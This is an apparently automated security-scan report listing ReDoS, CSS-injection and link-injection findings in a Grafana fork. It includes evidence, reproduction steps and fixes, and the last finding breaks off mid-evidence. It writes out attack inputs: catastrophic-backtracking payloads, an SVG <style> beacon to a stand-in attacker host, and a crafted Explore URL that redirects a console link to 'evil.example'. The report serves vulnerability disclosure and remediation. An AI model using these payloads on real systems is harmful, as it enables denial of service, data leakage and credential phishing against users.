`GraphiteDatasource.metricFindQuery()` (public/app/plugins/datasource/graphite/datasource.ts:700-707) handles Graphite template-variable queries. It first interpolates the editor-authored query with `templateSrv.replace()`, and when the interpolated text matches `/^tag_values\((.*)\)$/` it splits the argument text with `split(/,(?![^{]*\})/)`. For every comma in the argument text the negative lookahead `(?![^{]*\})` greedily consumes the rest of the string (no `{` is present), fails on `\}`, and backtracks character by character: O(n) work per comma and O(n^2) overall for n commas, all on the browser main thread before the `getTagValuesAutoComplete()` request is issued.

The argument text is attacker-influenced whenever the Graphite query variable references another variable whose value is set from the URL. The Graphite datasource has no custom `variables` support, so the scenes LegacyQueryRunner (recovered from public/build/7606.e8e4d98948a4bb1cf3bc.js.map) calls `metricFindQuery(variable.state.query, …)` directly; scenes `TextBoxVariable.updateFromUrl()` copies any string found under `var-<name>` into the variable value with no length cap, and the default Glob formatter returns `String(value)` unchanged. Example: a dashboard has a textbox variable `env` and a Graphite query variable with query `tag_values(host, env=$env)`. An attacker sends a victim a dashboard link whose `var-env` is a few hundred thousand commas; on load the query variable interpolates to `tag_values(host, env=,,,,…)`, matches the `tag_values` regex, and the split runs ~n^2/2 steps (about 5e9 for n=1e5, 4.5e10 for n=3e5), freezing the victim's tab for seconds to minutes until the browser's unresponsive-page prompt lets them kill it.

Preconditions (attack requirements): a dashboard whose Graphite query variable uses `tag_values(...)` with an argument interpolated from a URL-settable variable (textbox, or a variable allowing custom values), and a URL of roughly 100 KiB or more reaching the frontend. Assumption (no Go source in the checkout): Grafana's own listener is Go net/http with the default 1 MiB header limit and therefore admits such request lines; the docs (docs/sources/setup-grafana/configure-security/_index.md) present a reverse proxy as optional, not required, and document no URL-length control. Intermediaries with small request-line limits (e.g. 8 KiB) reduce the reachable n to a few thousand, where the cost is negligible.

## Evidence
1. [public/app/plugins/datasource/graphite/datasource.ts:700–707](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/graphite/datasource.ts#L700-L707)
   metricFindQuery() interpolates the variable query with templateSrv.replace() (lines 700-703), matches /^tag_values\((.*)\)$/ (706) and then splits the interpolated argument text with /,(?![^{]*\})/ (707). At every comma the negative lookahead's greedy [^{]* consumes the remainder of the string (which contains no '{'), fails on \} and backtracks one character at a time, so an interpolated argument of n commas costs ~n^2/2 regex steps on the main thread before getTagValuesAutoComplete() is ever called. The same regex ships in public/app/plugins/datasource/graphite/dist/module.js.
2. [public/app/features/templating/formatVariableValue.ts:29–30](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/templating/formatVariableValue.ts#L29-L30)
   With no explicit format, variable interpolation uses the Glob formatter, whose single-value branch (recovered @grafana/scenes formatRegistry) returns String(value) unchanged, so a textbox value consisting of several hundred thousand commas is spliced verbatim into the tag_values() argument text.

## Impact
The quadratic split blocks the victim's browser main thread for a duration the attacker sets through the URL length (seconds for 100 KiB, minutes for 300 KiB-1 MiB), rendering the Grafana tab unusable until the user kills it; no data is disclosed or altered and nothing persists beyond the tab.

## Reproduction steps
1. An unauthenticated attacker crafts a dashboard link carrying a very long `var-<textbox>` value of commas and lures a viewer of that dashboard into opening it; variable resolution runs the Graphite metricFindQuery automatically on load, with no further interaction. Exploitation requires a pre-existing dashboard whose Graphite tag_values() variable query interpolates a URL-settable variable (a common chained-variable pattern, but not universal) and that a URL of ~100 KiB or more reaches the frontend, which Grafana's own listener admits (Go default 1 MiB header limit, stated as an assumption): attack requirements are present. The attacker needs no account; the victim needs only to view the dashboard.

## Recommended fix
The tag_values() argument splitter in metricFindQuery rescans the remainder of the already-interpolated string at every comma via the lookahead /,(?![^{]*\})/, so URL-controlled variable values set a super-linear cost on the browser main thread. Fix criteria: Argument splitting must run in linear time regardless of input content (e.g. a single-pass scanner tracking brace depth), or be performed on the raw query before variable interpolation so variable values cannot influence the split. After the fix, interpolating a variable value of 10^6 commas into a tag_values() query must complete metricFindQuery's pre-request parsing in well under a second.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256300

---

# Quadratic regex on Log Analytics metadata function parameters from upstream response

## Details
`transformMetadataFunction` in public/app/plugins/datasource/azuremonitor/azure_log_analytics/utils.ts:13-46 parses each function's `parameters` string from the Log Analytics `/metadata` response with `METADATA_FUNCTION_PARAMS = /([\w\W]+):([\w]+)(?:\s?=\s?([\w\W]+))?/` (utils.ts:11). The pattern is unanchored and begins with a greedy, unbounded `[\w\W]+` that must be followed by a literal ':'. On a segment containing no ':' followed by a word character, a backtracking engine tries every start position and, for each, consumes to the end of the string and backtracks one character at a time; total work is Θ(n²) in the segment length. Segments come from `fn.parameters.split(', ')`, so a single `parameters` value without ', ' is one segment of arbitrary length; nothing bounds or anchors it (AzureLogAnalyticsMetadataFunction.parameters is an unconstrained string, types/logAnalyticsMetadata.ts:29).

`fn.parameters` is datasource data: `getKustoSchema` (azure_log_analytics_datasource.ts:105-109) fetches `loganalytics/v1<resourceUri>/metadata` through the plugin backend's resource proxy and hands the JSON directly to `transformMetadataToKustoSchema`. A compromised Log Analytics endpoint, or a party on the network path between the Grafana backend and the Azure API (threat-model adversary 4), can return one function whose `parameters` is a few hundred kilobytes of ':'-free filler — e.g. 300 KB yields on the order of 4.5·10^10 character steps (tens of seconds to minutes of main-thread blocking), and larger legitimately-sized metadata payloads (multi-MB) scale quadratically from there.

The parse runs on the browser main thread whenever an Editor opens a Logs query with a resource selected: LogsQueryEditor.tsx:89-116's effect calls `getKustoSchema(resources[0])` on mount and on resource change, and QueryEditor.tsx:172-174 renders LogsQueryEditor for every AzureQueryType.LogAnalytics query in both panel edit and Explore. The query editor is therefore unusable for every editor of the instance while the malicious upstream persists. The regex ships verbatim in the plugin's built module (public/app/plugins/datasource/azuremonitor/dist/module.js, `const m=/([\w\W]+):([\w]+)(?:\s?=\s?([\w\W]+))?/`).

Assumptions: the plugin backend's `loganalytics` route (gpx_azuremonitor, not in checkout) forwards the upstream metadata JSON unmodified and without a response size limit below a few hundred kilobytes (Log Analytics metadata responses are legitimately far larger); the victim's browser uses a backtracking regex engine (V8 irregexp, with its non-backtracking fallback engine disabled by default) that applies no literal prefilter for the non-leading required ':'.

## Evidence
1. [public/app/plugins/datasource/azuremonitor/azure\_log\_analytics/utils.ts:11–45](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/azure_log_analytics/utils.ts#L11-L45)
   METADATA_FUNCTION_PARAMS = /([\w\W]+):([\w]+)(?:\s?=\s?([\w\W]+))?/ is unanchored and starts with an unbounded greedy `[\w\W]+` that must be followed by a literal ':'. transformMetadataFunction applies it (`arg.match(...)`) to every segment of `fn.parameters.split(', ')`, with no length limit. For a segment containing no ':' the engine, at each of n start positions, consumes the rest of the string and backtracks character by character looking for ':', giving O(n^2) work; `fn.parameters` is a string taken verbatim from the upstream metadata JSON.
2. [public/app/plugins/datasource/azuremonitor/azure\_log\_analytics/azure\_log\_analytics\_datasource.ts:98–108](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/azure_log_analytics/azure_log_analytics_datasource.ts#L98-L108)
   getKustoSchema fetches `${resourcePath}/v1${resourceUri}/metadata` through the backend's loganalytics proxy route and passes the raw JSON straight into transformMetadataToKustoSchema, i.e. the metadata document (including every function's `parameters` string) is attacker-supplied when the upstream or the network path to it is compromised.
3. [public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/LogsQueryEditor.tsx:89–115](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/components/LogsQueryEditor/LogsQueryEditor.tsx#L89-L115)
   The effect calls datasource.azureLogAnalyticsDatasource.getKustoSchema(resources[0]) whenever a Logs query with a selected resource is shown in the editor, so any Editor who opens such a panel (or Explore) triggers the parse on the main thread.
4. [public/app/plugins/datasource/azuremonitor/types/logAnalyticsMetadata.ts:23–30](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/azuremonitor/types/logAnalyticsMetadata.ts#L23-L30)
   AzureLogAnalyticsMetadataFunction.parameters is typed as an arbitrary string with no constraint, confirming nothing in the type layer bounds it.

## Impact
The victim's browser tab is blocked for minutes to indefinitely on every attempt to open the Logs query editor, denying editing of Azure Monitor logs panels instance-wide while the upstream is malicious. No confidentiality or integrity effect.

## Reproduction steps
1. Attacker controls the Log Analytics metadata response reaching the Grafana backend (compromised upstream or machine-in-the-middle on the backend→Azure path). They include a function whose `parameters` is a long string with no ':' and no ', '. An Editor opens a panel or Explore with a Logs query that has a resource selected; getKustoSchema fetches the metadata and transformMetadataFunction runs the quadratic match on the main thread. No frontend defence stands in the way.

## Recommended fix
An unanchored regex with a leading unbounded greedy class is applied to unbounded upstream-supplied strings, so match time grows quadratically with attacker-chosen input length. Fix criteria: Parsing of `parameters` completes in time linear in the input (e.g. anchor the pattern and replace `[\w\W]+` with a class that excludes ':' such as `^([^:]+):(\w+)(?:\s?=\s?(.+))?$`, or split on the first ':' with indexOf), and/or reject or truncate `parameters` segments above a sane length before matching. Verified by feeding a multi-hundred-kilobyte ':'-free parameters string and observing transformMetadataToKustoSchema return promptly.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256299

---

# Graphite query editor compiles query refId into RegExp, enabling catastrophic backtracking from Explore URL state

## Details
The Graphite visual query editor resolves `#A`-style series references between queries in `GraphiteQuery.updateRenderedTarget()` (public/app/plugins/datasource/graphite/graphite_query.ts:227-247). For every query in the editor it constructs `RegExp(`\#(${id})`, 'g')` from that query's `refId` and executes `.match()` with it against every other query's `target` string to count references. The refId is interpolated into the regular-expression source without escaping, so the refId chooses the pattern and a sibling query's target chooses the subject string.

Both values are attacker-controlled through Explore URL state. The `panes` (or legacy `left`/`right`) JSON is parsed by the v1 migrator (public/app/features/explore/hooks/useStateSync/migrators/v1.ts:106), which copies `input.queries` as-is; `synchronizer/init.ts` runs it through `withUniqueRefIds()` (public/app/features/explore/utils/queries.ts), which returns the list unchanged when refIds are unique, filters only on datasource validity, and dispatches `initializeExplore`. Explore's QueryRows -> QueryEditorRows -> QueryEditorRow passes the complete list as the `queries` prop to `GraphiteQueryEditor`, whose context stores it at init and dispatches `queriesChanged`/`queryChanged` on prop changes. The store calls `handleTargetChanged()` -> `updateModelTarget(queries)` -> `updateRenderedTarget()` on those actions and on every editing action (segment, tag, function, function-param and text-editor edits).

Attack: an unauthenticated attacker crafts an Explore link whose pane names a Graphite datasource (by uid or name; `getPaneDatasource` otherwise falls back to the victim's last-used/default datasource) and whose queries are e.g. `{refId:"(a+)+$", target:"a.b"}` and `{refId:"B", target:"#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab"}`. When a logged-in victim with Explore access opens the link and makes any edit in the Graphite editor (clicking a segment, adding a function, typing in text mode, adding a query), `/\#((a+)+$)/g` is matched against `#aaa...ab`, which backtracks exponentially (2^n for n a's) and freezes the Grafana tab for seconds to minutes; longer runs make it effectively permanent. The same refIds can be stored in a dashboard by an Editor and reach Viewers who use the panel's Explore action, or Editors who open the panel editor. A refId containing an unbalanced bracket instead throws a SyntaxError inside the async reducer, leaving the editor non-functional.

Root cause: treating refId as a regex fragment rather than a literal identifier (CWE-1333 via unescaped interpolation). The sibling code in datasource.ts (buildGraphiteParams) uses the fixed pattern `/\#([A-Z])/g` and is not affected.

## Evidence
1. [public/app/plugins/datasource/graphite/graphite\_query.ts:227–246](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/graphite/graphite_query.ts#L227-L246)
   updateRenderedTarget() builds `RegExp(`\#(${id})`, 'g')` where `id` is each query's refId taken verbatim as the key of keyBy(targets,'refId'), then runs `t2.target.match(regex)` against every other query's target string. Neither the refId (pattern) nor the target (subject) is escaped or bounded, so a refId such as `(a+)+$` paired with a sibling target `#aaaa...ab` backtracks exponentially on the victim's main thread; a refId like `[` throws SyntaxError inside the async reducer. The fixed pattern /\#([A-Z])/g on line 230 shows the intended literal-identifier semantics.
2. [public/app/plugins/datasource/graphite/state/helpers.ts:156–177](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/graphite/state/helpers.ts#L156-L177)
   handleTargetChanged() calls queryModel.updateModelTarget() with every query in the editor whose `target` is a string — the only caller path into updateRenderedTarget; the filter checks only the type of target, never the shape of refId.
3. [public/app/plugins/datasource/graphite/state/store.ts:72–80](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/graphite/state/store.ts#L72-L80)
   The reducer invokes handleTargetChanged on queriesChanged and queryChanged here, and likewise on segmentValueChanged, tagChanged, addNewTag, removeFunction, moveFunction, updateFunctionParam and updateQuery (lines 174-177, text-editor typing), so any edit in the Graphite editor triggers the regex construction and matching.
4. [public/app/plugins/datasource/graphite/state/context.tsx:53–73](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/graphite/state/context.tsx#L53-L73)
   GraphiteQueryEditorContext dispatches queriesChanged whenever JSON.stringify(queries) changes and queryChanged when the query text changes; `queries` is the full list passed by the host (Explore or dashboard panel editor) and is stored into the editor state at init (lines 89-104).
5. [public/app/features/explore/hooks/useStateSync/synchronizer/init.ts:42–75](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/synchronizer/init.ts#L42-L75)
   Explore URL init takes each pane's `queries` from the parsed URL state (v1 migrator, migrators/v1.ts:106, copies `input.queries` as an array without per-field validation), passes them through withUniqueRefIds() and filters only on datasource validity, then dispatches initializeExplore with the attacker-shaped list; refId and target strings reach Redux state unchanged.
6. [public/app/features/explore/utils/queries.ts:7–32](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/utils/queries.ts#L7-L32)
   withUniqueRefIds() returns the query list untouched when every refId is truthy and unique, so an arbitrary refId string such as `(a+)+$` survives verbatim; only duplicate/missing refIds are regenerated.
7. [public/app/features/query/components/QueryEditorRow.tsx:258–267](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/query/components/QueryEditorRow.tsx#L258-L267)
   QueryEditorRow (mounted by Explore's QueryRows -> QueryEditorRows with app=CoreApp.Explore) renders the plugin QueryEditor with `queries={queries}`, delivering the whole URL-shaped query list (all refIds and targets) to the Graphite editor.

## Impact
Impact is confined to the victim's browser session: the Grafana tab's main thread is blocked by catastrophic backtracking (or the editor is broken by a thrown SyntaxError). No data is disclosed or altered; the victim recovers by closing the tab, so availability impact is low.

## Reproduction steps
1. No account is needed: the attacker crafts an Explore URL whose JSON pane state names a Graphite datasource (uid or name — not secret; default names are guessable, and getPaneDatasource falls back to the victim's last-used/default datasource) and contains one query with a pathological refId plus a sibling whose target is the matching subject string, then delivers it as a link. The v1 URL migrator and withUniqueRefIds preserve both strings verbatim. The victim (any user who can use Explore) opens it and performs any edit in the Graphite query editor, which runs handleTargetChanged -> updateRenderedTarget and the exponential regex match. No escaping, refId validation or length cap stands in the way; the only precondition is that a Graphite datasource exists, which is the baseline for this plugin.

## Recommended fix
updateRenderedTarget() interpolates the query refId into a RegExp source string without escaping, so a refId can supply regex syntax (including nested quantifiers) that is executed against other queries' target strings. Fix criteria: Reference counting must treat refId as a literal token: either escape all regex metacharacters before building the pattern, or avoid regex entirely by matching the literal `#<refId>` with string search (as the fixed `/\#([A-Z])/g` pattern elsewhere does). After the fix, a refId such as `(a+)+$` with a sibling target of `#` followed by 40 `a`s and a `b` must complete handleTargetChanged in linear time and must not throw for refIds containing brackets.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256298

---

# SVG inlined by SanitizedSVG keeps <style>, giving dashboard Editors document-wide CSS in every viewer's page

## Details
SanitizedSVG (public/app/core/components/SVG/SanitizedSVG.tsx) wraps react-inlinesvg with preProcessor=getCleanSVG, which is only textUtil.sanitizeSVGContent = DOMPurify.sanitize(code, {USE_PROFILES:{svg:true, svgFilters:true}}) (recovered packages/grafana-data/src/text/sanitize.ts:112-114 in public/build/6540.*.js.map). DOMPurify's svg profile tag list (recovered purify.es.mjs line 300 in public/build/7606.*.js.map) contains 'style', so a <style> element and its CSS text survive. react-inlinesvg then parses the string with DOMParser text/html, converts it with react-from-dom (whose noTextChildNodes list does not include 'style', so the CSS text is kept) into React elements, and React mounts the <svg><style> inline in the dashboard document. A <style> inside inline SVG in an HTML document is an ordinary document stylesheet; its selectors match every element on the page, not just the SVG. The in-tree scoping step svgStyleCleanup is selected only when the cleanStyle prop is true, and no caller in public/app passes it (icon.tsx, MarkersLegend.tsx, ResourcePicker.tsx, ResourceCards.tsx, URLPickerTab.tsx, FileUploader.tsx all omit it), so it is dead; it would anyway only prefix class selectors.

Attack path (default configuration, no server needed): a dashboard Editor adds a Canvas panel Icon element. icon.tsx prepareData (lines 89-99) resolves config.path via dimensionContext.getResource -> getResourceDimensionFromData -> getResourceDimension, whose getPublicOrAbsoluteUrl (resource.ts:10-21) returns any value containing ':/' unchanged. The Editor sets `fixed` (through the resource picker's URL tab, documented in docs/sources/visualizations/panels-visualizations/visualizations/canvas/index.md 'Add a custom icon', or directly in the saved dashboard JSON) to either (a) an https:// URL of an attacker-hosted SVG served as image/svg+xml with CORS, or (b) an inline value such as `data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><style>...</style></svg>` or the raw `<svg xmlns="http://...">...` markup: react-inlinesvg (recovered dist/index.mjs lines 237-248) decodes data:image/svg URIs and uses any src containing '<svg' as the content without fetching, so the payload can be stored entirely in the dashboard. IconDisplay renders <SanitizedSVG src={data.path}> (icon.tsx:53) for every user who opens the dashboard. In Field/Mapping modes the same value comes from a datasource field (adversary 4). The resulting CSS applies to the whole Grafana page in the victim's authenticated origin: hide/overlay UI (fake banners via ::before/content, invisible covers), presence beacons and attribute-selector exfiltration via url() (e.g. a[href*=...], input[value^=...]), and same-origin GET requests with the victim's cookie. The shipped CSP template (conf/defaults.ini:547, off by default) has style-src 'unsafe-inline' and img-src *, so it would not block this either.

What this grants beyond sanctioned paths: the Text panel's xss whitelist (sanitize.ts XSSWL) escapes <style> elements and only permits per-element style attributes filtered by the css whitelist, i.e. CSS scoped to the Editor's own markup; this path yields an unscoped document stylesheet that restyles elements outside the Editor's panel. Script execution is still blocked (DOMPurify strips script/handlers/foreignObject/use; React blocks javascript: URLs), so impact is CSS-level only.

Explicit dependency assumptions (not installed in the checkout; read from the bundled source maps): DOMPurify 3.x as bundled in public/build/7606.e8e4d98948a4bb1cf3bc.js.map keeps 'style' under USE_PROFILES {svg,svgFilters}; react-inlinesvg (same map) inlines data:/'<svg' sources and converts via react-from-dom into React elements; browsers apply <style> inside inline SVG document-wide (standard CSSOM behaviour).

## Evidence
1. [public/app/core/components/SVG/SanitizedSVG.tsx:9–23](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/components/SVG/SanitizedSVG.tsx#L9-L23)
   SanitizedSVG passes the SVG text to react-inlinesvg with preProcessor=getCleanSVG, which is only textUtil.sanitizeSVGContent (DOMPurify USE_PROFILES {svg, svgFilters}, whose tag list includes 'style'). The scoping variant getCleanSVGAndStyle is used only when the cleanStyle prop is true, and no caller in public/app sets it, so <style> elements survive and are mounted inline in the HTML document, where their rules apply page-wide. This is the code the fix must change.
2. [public/app/features/canvas/elements/icon.tsx:38–54](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/canvas/elements/icon.tsx#L38-L54)
   Canvas Icon element renders <SanitizedSVG src={data.path}> for every user viewing the dashboard; data.path comes from prepareData (lines 89-99) via dimensionContext.getResource(iconConfig.path).value(), i.e. the Editor's `fixed` value or a datasource field/mapping value, unvalidated.
3. [public/app/features/dimensions/resource.ts:10–20](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dimensions/resource.ts#L10-L20)
   getPublicOrAbsoluteUrl returns any value containing ':/' unchanged, so an attacker-hosted https:// URL, a data:image/svg+xml URI or raw <svg xmlns="http://..."> markup (which react-inlinesvg inlines without fetching) reaches SanitizedSVG as src.
4. [public/app/features/dimensions/editors/URLPickerTab.tsx:18–39](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dimensions/editors/URLPickerTab.tsx#L18-L39)
   The resource picker's URL tab lets a dashboard Editor enter an arbitrary icon URL (the documented 'Add a custom icon' flow), confirming external/arbitrary SVG sources are an intended input to this sink; the value is stored in the dashboard JSON as config.path.fixed.
5. [public/app/core/components/SVG/utils.ts:15–29](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/components/SVG/utils.ts#L15-L29)
   svgStyleCleanup is the maintainers' attempt to scope <style> rules to the root svg id, showing awareness that inlined SVG styles leak to the page; it is unreachable (cleanStyle never set) and, even if wired in, only prefixes class selectors (regex /(#(.*?))?\./), leaving element, attribute, universal and @import rules unscoped.

## Impact
Attacker-controlled CSS in the victim's authenticated Grafana origin, unscoped to the attacker's panel: UI redress and hiding/overlaying of controls outside the panel (integrity, limited), covert url() requests to attacker hosts and attribute-selector leakage of attribute values present on the page (confidentiality, limited). No script execution, no session theft, no availability impact.

## Reproduction steps
1. Attacker is a dashboard Editor (or a datasource controlling the icon field value). They set a Canvas Icon's SVG path to an SVG containing a <style> block — hosted with CORS, or embedded directly as a data:image/svg+xml URI / raw <svg> markup that react-inlinesvg inlines without any fetch, so no server is needed. getPublicOrAbsoluteUrl passes it through, DOMPurify's svg profile keeps <style>, the scoping code is never invoked, and React mounts it. Any Viewer or Admin who opens the dashboard gets the CSS applied page-wide. Default configuration; the shipped CSP template would not block inline styles either.

## Recommended fix
1. SanitizedSVG inlines remote, attacker-controllable SVG into the host document after a sanitizer that intentionally preserves <style>; CSS inside inline SVG is document-global, so Editor/datasource CSS escapes the SVG and restyles the viewer's page (viewer-origin integrity boundary). Fix criteria: CSS contained in an SVG loaded through SanitizedSVG must not affect any element outside that SVG. Acceptable outcomes: strip <style> for inlined SVGs (e.g. FORBID_TAGS ['style'] on the inlining path), reliably scope every rule to the SVG, or render untrusted SVG via a non-inlining mechanism (<img> / isolated shadow root). Verify by loading an SVG whose <style> contains `body{display:none}` and `*{background:url(https://attacker/x)}` as a Canvas icon and confirming the page layout and network traffic are unaffected.
2. The intended mitigation svgStyleCleanup is unreachable (cleanStyle never passed) and incomplete (only class selectors are prefixed), giving a false sense that styles are scoped. Fix criteria: Either remove the dead scoping code or make SanitizedSVG apply a complete scoping/stripping step unconditionally for untrusted sources; a test should assert that element, attribute, universal and @import rules in a fetched SVG do not match elements outside the SVG.

---
**Severity:** LOW
**Status:** Open
**Category:** CSS injection
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256296

---

# CloudWatch console deep-link hostname built from unvalidated query region

## Details
The CloudWatch datasource (core plugin, public/app/plugins/datasource/cloudwatch) builds AWS console deep links by string-templating the query's `region` into the hostname: `aws_url.ts` returns `https://${region}.console.aws.amazon.com/cloudwatch/home?region=${region}#logs-insights:queryDetail=<JSURL>`. `region` is never validated as a region token and is not percent-encoded, so any value containing `/`, `?`, `#` or `@` moves the fixed `.console.aws.amazon.com` suffix out of the authority and makes the attacker-chosen string the link's host.

Primary sink (default configuration): `CloudWatchLink.tsx` — the 'CloudWatch Logs Insights' LinkButton (target=_blank) shown in the Logs query editor in Explore and in panel edit. Its href is `encodeUrl(urlProps, datasource.resources.getActualRegion(query.region))`; `getActualRegion` (CloudWatchRequest.ts:145) neither validates nor interpolates, and the Region selector allows custom values. @grafana/ui LinkButton passes href only through braintree sanitizeUrl (recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map), which blocks script schemes but admits any https host.

Delivery: an unauthenticated attacker crafts an Explore URL — `/explore?schemaVersion=1&panes={"abc":{"datasource":"<CloudWatch ds name or uid>","queries":[{"refId":"A","queryMode":"Logs","region":"evil.example/?","expression":"fields @timestamp","logGroupNames":["x"]}],"range":{"from":"now-1h","to":"now"}}}` — and sends it to a logged-in user with Explore access to that datasource (Explore is enabled by default, conf/defaults.ini [explore] enabled = true). migrators/v1.ts applyDefaults() copies `queries` verbatim; synchronizer/init.ts → initializeExplore() dispatches runQueries() automatically; runRequest sets `request` on the PanelData before the datasource is called and filterPanelDataToQuery() preserves it, so even though the backend rejects the bogus region the editor renders a Grafana-styled button labelled 'CloudWatch Logs Insights' whose href is `https://evil.example/?.console.aws.amazon.com/cloudwatch/home?region=evil.example/?#logs-insights:...`. Clicking it opens the attacker's origin in a new tab. An Editor can equally persist such a region in a dashboard panel's logs query; a Viewer who uses the panel's 'Explore' action, or anyone opening panel edit, gets the same button.

Additional sinks of the same root cause: `utils/datalinks.ts` attaches `encodeUrl(..., replace(curTarget.region))` as a DataLink on every logs frame when the unregistered toggle `cloudWatchLogsInsightsDataLinks` is on (then a `var-region=` URL parameter on a dashboard using `$region` turns into a 'View in CloudWatch console' link for every viewer, carrying the dashboard's query text and log-group ARNs in the fragment); `ThrottlingErrorMessage.tsx` / `getThrottlingErrorMessage` repeat the pattern but need an AWS throttling error for the target.

Impact: a trusted-looking, Grafana-rendered control that claims to open the AWS console opens an attacker-controlled https origin (phishing for AWS credentials, drive-by). Scheme is fixed to https and React renders the href, so this is link/host injection, not script execution.

Assumptions: @grafana/ui LinkButton/TextLink behave as recovered from the shipped source map (sanitizeUrl = braintree 6.0.x); Explore accepts a datasource name or uid in the URL as explore/state/utils.ts:107 states.

## Evidence
1. [public/app/plugins/datasource/cloudwatch/aws\_url.ts:18–32](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/aws_url.ts#L18-L32)
   getLogsEndpoint()/encodeUrl() interpolate the caller-supplied `region` string directly into the authority of an https URL (`https://${region}.console.aws.amazon.com/...`) and again, unencoded, into the `?region=` query. The only inspection of `region` is two startsWith() checks that choose a partition suffix; nothing requires it to be a region token. A value such as `evil.example/?` yields `https://evil.example/?.console.aws.amazon.com/...`, whose host is the attacker's. This is the function the fix must change.
2. [public/app/plugins/datasource/cloudwatch/components/QueryEditor/LogsQueryEditor/CloudWatchLink.tsx:21–50](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/components/QueryEditor/LogsQueryEditor/CloudWatchLink.tsx#L21-L50)
